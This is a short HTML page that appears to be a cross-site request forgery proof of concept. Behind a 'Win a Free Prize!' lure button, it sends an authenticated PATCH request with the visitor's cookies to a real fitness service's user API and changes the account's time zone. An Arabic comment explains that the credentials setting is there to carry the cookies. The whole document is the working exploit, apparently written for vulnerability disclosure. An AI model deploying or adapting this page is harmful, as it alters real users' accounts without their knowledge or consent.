<!DOCTYPE html>
<html>
<head>
    <title>Click Me!</title>
</head>
<body>
    <h1>Win a Free Prize!</h1>
    <button onclick="sendRequest()">Click Here</button>

    <script>
        function sendRequest() {
            fetch('https://www.myfitnesspal.com/api/services/users', {
                method: 'PATCH',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    "item": {
                        "location_preferences": {
                            "time_zone": "America/New_York"
                        }
                    }
                }),
                credentials: 'include' // هذا مهم لإرسال الكوكيز مع الطلب
            });
        }
    </script>
</body>
</html>
